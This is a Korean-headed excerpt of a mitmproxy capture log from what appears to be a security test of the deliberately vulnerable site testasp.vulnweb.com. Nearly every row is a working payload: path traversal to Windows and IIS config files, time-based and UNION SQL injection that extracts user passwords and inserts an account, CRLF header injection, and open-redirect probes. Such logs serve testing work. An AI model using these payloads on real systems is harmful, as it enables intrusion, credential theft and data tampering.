# mitmproxy 캡처 발췌 — phase 2 (2026-09-28)

원본은 `.phase-runtime/current/capture.jsonl`(phase 로컬 — **phase 종료 시 cleanup 으로 삭제됨**).
전체 329건 중 공격 페이로드/탐색 요청 **187건**만 발췌해 project 폴더에 남긴다(URL 은 디코딩 후 표기).

| # | status | method | 요청 URL (디코딩) |
|---|---|---|---|
| 1 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/about.html` |
| 2 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=db.asp` |
| 3 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=logInput.asp` |
| 4 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Login.asp` |
| 5 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=showforum.asp` |
| 6 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=showthread.asp` |
| 7 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Search.asp` |
| 8 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Templatize.asp` |
| 9 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Register.asp` |
| 10 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Logout.asp` |
| 11 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Default.asp` |
| 12 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=web.config` |
| 13 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: splittest=1` |
| 14 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: splittest2=1` |
| 15 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp` |
| 16 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../scripts/logInput.txt` |
| 17 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../scripts/` |
| 18 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/inetsrv/config/applicationHost.config` |
| 19 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../inetpub/wwwroot/web.config` |
| 20 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../boot.ini` |
| 21 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/drivers/etc/networks` |
| 22 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/win.ini` |
| 23 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Default.asp.bak` |
| 24 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=web.config.bak` |
| 25 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=global.asa` |
| 26 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Templates/MainTemplate.dwt.asp` |
| 27 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/about.html` |
| 28 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=logInput.txt` |
| 29 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/logfiles/` |
| 30 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;WAITFOR DELAY '0:0:05'--` |
| 31 | 500 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1';WAITFOR DELAY '0:0:05'--` |
| 32 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: splittest=1` |
| 33 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: splittest2=1` |
| 34 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp` |
| 35 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../scripts/logInput.txt` |
| 36 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../scripts/` |
| 37 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/inetsrv/config/applicationHost.config` |
| 38 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../inetpub/wwwroot/web.config` |
| 39 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../boot.ini` |
| 40 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/drivers/etc/networks` |
| 41 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/win.ini` |
| 42 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Default.asp.bak` |
| 43 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=web.config.bak` |
| 44 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=global.asa` |
| 45 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=Templates/MainTemplate.dwt.asp` |
| 46 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/about.html` |
| 47 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=logInput.txt` |
| 48 | 500 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../Windows/System32/logfiles/` |
| 49 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;WAITFOR DELAY '0:0:05'--` |
| 50 | 500 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1';WAITFOR DELAY '0:0:05'--` |
| 51 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;WAITFOR DELAY '0:0:01'--` |
| 52 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;WAITFOR DELAY '0:0:03'--` |
| 53 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;WAITFOR DELAY '0:0:08'--` |
| 54 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;WAITFOR DELAY '0:0:02'--` |
| 55 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;WAITFOR DELAY '0:0:08'--` |
| 56 | 500 | GET | `http://testasp.vulnweb.com/showthread.asp?id=IF 1=1 WAITFOR DELAY '0:0:04'--` |
| 57 | 500 | GET | `http://testasp.vulnweb.com/showthread.asp?id=IF 1=2 WAITFOR DELAY '0:0:04'--` |
| 58 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:05'--` |
| 59 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;IF (SELECT IS_SRVROLEMEMBER('db_owner'))=1 WAITFOR DELAY '0:0:05'--` |
| 60 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;IF (SELECT USER_NAME())='dbo' WAITFOR DELAY '0:0:05'--` |
| 61 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value_in_use=1) WAITFOR DELAY '0:0:05'--` |
| 62 | 200 | GET | `http://testasp.vulnweb.com/showforum.asp?id=1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='Ole Automation Procedures' AND value_in_use=1) WAITFOR DELAY '0:0:05'--` |
| 63 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,'ACU-POSTER','ACU-TITLE','ACU-MESSAGE',1,1,GETDATE(),'ACU-AVATAR','ACU-TTITLE','ACU-FORUM'--` |
| 64 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT SUSER_SNAME()),CAST((SELECT @@version) AS nvarchar(400)),(SELECT DB_NAME()),1,1,GETDATE(),'A','TT',(SELECT TOP 1 name FROM sys.tables)--` |
| 65 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT TOP 1 name FROM sys.tables),'T','M',1,1,GETDATE(),'A','TT',(SELECT TOP 1 name FROM sys.tables)--` |
| 66 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT TOP 1 uname FROM users),(CAST((SELECT TOP 1 upass FROM users) AS nvarchar(200))),(CAST((SELECT TOP 1 email FROM users) AS nvarchar(200))),1,1,GETDATE(),'A','TT','FN'--` |
| 67 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=1 WAITFOR DELAY '0:0:04'--` |
| 68 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=2 WAITFOR DELAY '0:0:04'--` |
| 69 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:04'--` |
| 70 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_MEMBER('db_owner'))=1 WAITFOR DELAY '0:0:04'--` |
| 71 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_MEMBER('db_datawriter'))=1 WAITFOR DELAY '0:0:04'--` |
| 72 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_MEMBER('db_datareader'))=1 WAITFOR DELAY '0:0:04'--` |
| 73 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_SRVROLEMEMBER('securityadmin'))=1 WAITFOR DELAY '0:0:04'--` |
| 74 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT USER_NAME())='dbo' WAITFOR DELAY '0:0:04'--` |
| 75 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT SUSER_SNAME())='acunetix' WAITFOR DELAY '0:0:04'--` |
| 76 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('posts','OBJECT','INSERT'))=1 WAITFOR DELAY '0:0:04'--` |
| 77 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT TOP 1 uname FROM users),(CAST((SELECT TOP 1 upass FROM users) AS nvarchar(100))),(CAST((SELECT TOP 1 email FROM users) AS nvarchar(200))),1,1,GETDATE(),'A','TT','FN'--` |
| 78 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT TOP 1 realname FROM users),(CAST((SELECT TOP 1 avatar FROM users) AS nvarchar(100))),(CAST((SELECT COUNT(*) FROM users) AS nvarchar(20))),1,1,GETDATE(),'A','TT','FN'--` |
| 79 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM sys.databases FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 80 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 81 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('users') FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 82 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM sys.columns WHERE object_id=OBJECT_ID('posts') FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 83 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT SUSER_SNAME()),CAST((SELECT @@version) AS nvarchar(200)),(SELECT DB_NAME()),1,1,GETDATE(),'A','TT',(SELECT STUFF((SELECT ','+name FROM sys.server_principals WHERE type IN ('S','U','G') FOR XML PATH('')),1,1,''))--` |
| 84 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acublog.sys.tables FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 85 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acuservice.sys.tables FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 86 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acublog.sys.schemas FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 87 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.sys.tables) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 88 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acuservice.sys.schemas FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 89 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acuservice.sys.tables) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 90 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 91 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM posts) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 92 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM threads) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 93 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM forums) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 94 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acublog.sys.tables FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 95 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acuservice.sys.tables FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 96 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acublog.sys.schemas FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 97 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.sys.tables) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 98 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acuservice.sys.schemas FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 99 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acuservice.sys.tables) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 100 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 101 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM posts) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 102 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM threads) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 103 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM forums) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 104 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.users) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 105 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.news) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 106 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.comments) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 107 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acuservice.dbo.users) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 108 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acublog.sys.columns WHERE object_id=OBJECT_ID('acublog.dbo.users') FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 109 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT ','+name FROM acuservice.sys.columns WHERE object_id=OBJECT_ID('acuservice.dbo.users') FOR XML PATH('')),1,1,'')),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 110 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 111 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF NOT EXISTS(SELECT 1 FROM users WHERE uname='acu-r7 proof') INSERT INTO users (uname,upass,email,realname,avatar) VALUES ('acu-r7 proof','P@ss-r7','r7@example.com','r7','')--` |
| 112 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 113 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(CAST((SELECT upass FROM users WHERE uname='acu-r7 proof') AS nvarchar(100))),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 114 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(CAST((SELECT realname FROM users WHERE uname='acu-r7 proof') AS nvarchar(100))),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 115 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM threads) AS nvarchar(10)),1,1,GETDATE(),'A','TT','FN'--` |
| 116 | 302 | GET | `http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/` |
| 117 | 302 | GET | `http://testasp.vulnweb.com/Logout.asp?RetURL=//example.com/` |
| 118 | 404 | GET | `http://testasp.vulnweb.com/Default~1.asp` |
| 119 | 404 | GET | `http://testasp.vulnweb.com/Templa~1.asp` |
| 120 | 404 | GET | `http://testasp.vulnweb.com/Templat~1.asp` |
| 121 | 404 | GET | `http://testasp.vulnweb.com/showfo~1.asp` |
| 122 | 404 | GET | `http://testasp.vulnweb.com/web~1.con` |
| 123 | 404 | GET | `http://testasp.vulnweb.com/Login~1.asp` |
| 124 | 404 | GET | `http://testasp.vulnweb.com/Search~1.asp` |
| 125 | 404 | GET | `http://testasp.vulnweb.com/db~1.asp` |
| 126 | 404 | GET | `http://testasp.vulnweb.com/Templates/MainTemp~1.dwt.asp` |
| 127 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(CAST((SELECT avatar FROM users WHERE uname='netsparker(0x001DFE)') AS nvarchar(50))),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 128 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(CAST((SELECT avatar FROM users WHERE uname='acu-r9-reg') AS nvarchar(50))),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 129 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r9-reg') AS nvarchar(10)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 130 | 404 | PUT | `http://testasp.vulnweb.com/r10probe.txt` |
| 131 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_MEMBER('db_datawriter'))=1 WAITFOR DELAY '0:0:04'--` |
| 132 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','INSERT'))=1 WAITFOR DELAY '0:0:04'--` |
| 133 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acublog.dbo.users','OBJECT','UPDATE'))=1 WAITFOR DELAY '0:0:04'--` |
| 134 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acublog.dbo.comments','OBJECT','INSERT'))=1 WAITFOR DELAY '0:0:04'--` |
| 135 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acuservice.dbo.users','OBJECT','SELECT'))=1 WAITFOR DELAY '0:0:04'--` |
| 136 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acuservice.dbo.users','OBJECT','UPDATE'))=1 WAITFOR DELAY '0:0:04'--` |
| 137 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','ALTER'))=1 WAITFOR DELAY '0:0:04'--` |
| 138 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME('acuforum.dbo.users','OBJECT','CONTROL'))=1 WAITFOR DELAY '0:0:04'--` |
| 139 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT IS_SRVROLEMEMBER('bulkadmin'))=1 WAITFOR DELAY '0:0:04'--` |
| 140 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT HAS_PERMS_BY_NAME(NULL,NULL,'ADMINISTER BULK OPERATIONS'))=1 WAITFOR DELAY '0:0:04'--` |
| 141 | 500 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT object_id('xp_cmdshell') IS NOT NULL) WAITFOR DELAY '0:0:04'--` |
| 142 | 500 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT object_id('master.dbo.xp_dirtree') IS NOT NULL) WAITFOR DELAY '0:0:04'--` |
| 143 | 500 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF (SELECT object_id('master.dbo.xp_fileexist') IS NOT NULL) WAITFOR DELAY '0:0:04'--` |
| 144 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;DECLARE @e int; EXEC master.dbo.xp_fileexist 'C:\Windows\win.ini', @e OUTPUT; IF @e=1 WAITFOR DELAY '0:0:04'--` |
| 145 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;DECLARE @e int; EXEC master.dbo.xp_fileexist 'C:\scripts\logInput.txt', @e OUTPUT; IF @e=1 WAITFOR DELAY '0:0:04'--` |
| 146 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;DECLARE @e int; EXEC master.dbo.xp_fileexist 'C:\inetpub\wwwroot', @e OUTPUT; IF @e=1 WAITFOR DELAY '0:0:04'--` |
| 147 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;DECLARE @e int; EXEC master.dbo.xp_fileexist 'C:\nope\nope.txt', @e OUTPUT; IF @e=1 WAITFOR DELAY '0:0:04'--` |
| 148 | 404 | GET | `http://testasp.vulnweb.com/r10probe.txt` |
| 149 | 404 | GET | `http://testasp.vulnweb.com/r10probe.asp` |
| 150 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM users WHERE uname IN ('acu-r7 proof','acu-r9-reg')) AS nvarchar(10)),1,1,GETDATE(),'A','TT','FN'--` |
| 151 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),1,1,1,1,'A','TT','FN'--` |
| 152 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r9-reg') AS nvarchar(10)),CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10)),1,1,1,1,'A','TT','FN'--` |
| 153 | 500 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,(SELECT STUFF((SELECT TOP 5 ','+uname FROM users FOR XML PATH('')),1,1,'')),1,1,1,1,'A','TT','FN'--` |
| 154 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM posts WHERE message LIKE '%ACU%') AS nvarchar(10)),1,1,1,1,1,'A','TT','FN'--` |
| 155 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,'ACU-VERIFY-OK','T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 156 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=1 WAITFOR DELAY '0:0:03'--` |
| 157 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=2 WAITFOR DELAY '0:0:03'--` |
| 158 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../windows/win.ini` |
| 159 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/../web.config` |
| 160 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=db.asp` |
| 161 | 200 | GET | `http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/` |
| 162 | 302 | GET | `http://testasp.vulnweb.com/Logout.asp?RetURL=http://example.com/` |
| 163 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,CAST((SELECT COUNT(*) FROM acublog.dbo.comments) AS nvarchar(20)),'T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 164 | 404 | GET | `http://testasp.vulnweb.com/Default~1.asp` |
| 165 | 302 | POST | `http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp
Set-Cookie: x=1` |
| 166 | 200 | GET | `http://testasp.vulnweb.com/Search.asp?tfSearch=q')>0) UNION ALL SELECT 1,'ACU-VERIFY-OK','T','M',1,1,GETDATE(),'A','TT','FN'--` |
| 167 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=1 WAITFOR DELAY '0:0:03'--` |
| 168 | 200 | GET | `http://testasp.vulnweb.com/showthread.asp?id=0;IF 1=2 WAITFOR DELAY '0:0:03'--` |
| 169 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../windows/win.ini` |
| 170 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=html/../web.config` |
| 171 | 200 | GET | `http://testasp.vulnweb.com/Templatize.asp?item=db.asp` |
| 172 | 200 | GET | `http://testasp.vulnweb.com/Login.asp?RetURL=http://example.com/` |
